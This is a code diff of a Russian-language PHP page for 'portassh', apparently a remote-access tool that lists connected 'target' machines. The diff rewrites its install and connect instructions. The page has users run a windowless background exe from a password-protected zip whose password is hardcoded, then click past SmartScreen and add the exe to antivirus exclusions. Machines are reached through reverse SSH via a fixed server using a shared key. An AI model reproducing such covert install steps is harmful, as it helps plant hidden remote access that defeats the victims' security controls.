@@ -125,7 +125,7 @@ echo '<h1>portassh — активные машины: <span class="count">' . co
 $PW = 'RtnM91jK.!';
 ?>
 <div class="box">
-<details open>
+<details>
 <summary>📖 Что такое portassh и как этим пользоваться — нажмите, чтобы раскрыть/свернуть</summary>
 
 <h2>Что это</h2>
@@ -139,21 +139,34 @@ portassh подтверждает туннель каждую минуту; ма
 
 <h2>Установка на целевом компьютере (Windows)</h2>
 <ol>
-<li>Скачайте <b>portassh.zip</b> кнопкой выше (браузеры не блокируют zip, в отличие от exe).</li>
-<li>Извлеките архив — пароль архива: <span class="pw">RtnM91jK.!</span></li>
-<li>Запустите <span class="cmd">portassh.exe</span>. Окно не появится — это нормально,
-программа работает в фоне.</li>
-<li>Через минуту машина появится в таблице выше. Если SmartScreen предупреждает —
-«Подробнее» → «Выполнить в любом случае». Если антивирус удаляет файл — добавьте
-portassh.exe в доверенные.</li>
+<li>Нажмите «⬇ Скачать .zip» выше.</li>
+<li>Распакуйте архив. Пароль архива: <span class="pw">RtnM91jK.!</span></li>
+<li>Запустите <span class="cmd">portassh.exe</span> двойным кликом. Окна нет — так и
+задумано: программа работает в фоне.</li>
 </ol>
+<p>Готово — через минуту компьютер появится в таблице выше.</p>
+<p style="font-size:13px;color:#cbd6ea">Если Windows покажет синее окно (SmartScreen):
+«Подробнее» → «Выполнить в любом случае».
+Если антивирус удалил файл: добавьте portassh.exe в исключения антивируса и скачайте заново.</p>
 
 <h2>Подключение с другого компьютера (Mac / Linux / Windows с OpenSSH)</h2>
-<p><b>Один раз:</b> скачайте кнопкой «🔑 Ключ» файл <span class="cmd">portassh_client.key</span>
-и положите его в папку, откуда будете подключаться (на Mac/Linux: <span class="cmd">chmod 600 portassh_client.key</span>).
-С этим ключом подключение проходит <b>без единого пароля</b>.</p>
-<p>Найдите нужную машину в таблице выше, скопируйте её команду подключения и выполните в терминале:</p>
-<p class="cmd">ssh -o StrictHostKeyChecking=accept-new -J support@5.35.81.198 -p &lt;ПОРТ&gt; anyuser@localhost</p>
+<ol>
+<li><b>Один раз:</b> нажмите «🔑 Ключ» выше — сохранится файл
+<span class="cmd">portassh_client.key</span> (обычно в папку «Загрузки»).</li>
+<li>Откройте терминал в той же папке:
+<ul>
+<li>Windows: Win+R → введите <span class="cmd">cmd</span> → Enter →
+в чёрном окне введите <span class="cmd">cd %USERPROFILE%\Downloads</span></li>
+<li>Mac/Linux: <span class="cmd">cd ~/Downloads</span></li>
+</ul></li>
+<li>Скопируйте команду нужной машины из таблицы ниже и вставьте в терминал.</li>
+</ol>
+<p>Всё — вы на удалённом компьютере. С ключом пароль не спросится
+(пароль — запасной вариант, если ключа нет).</p>
+<p style="font-size:13px;color:#cbd6ea">Команду можно запускать из любой папки, если
+в ней лежит portassh_client.key. Храните ключ только у себя — он заменяет пароль.</p>
+<p>Команда из таблицы выглядит так:</p>
+<p class="cmd">ssh -i portassh_client.key -o StrictHostKeyChecking=accept-new -J support@5.35.81.198 -p &lt;ПОРТ&gt; anyuser@localhost</p>
 <p>Если ключа нет (или он не подхватился), подключение попросит пароль <b>два раза</b> —
 оба раза вводится один и тот же пароль (резервный вход):</p>
 <table class="pwtab">
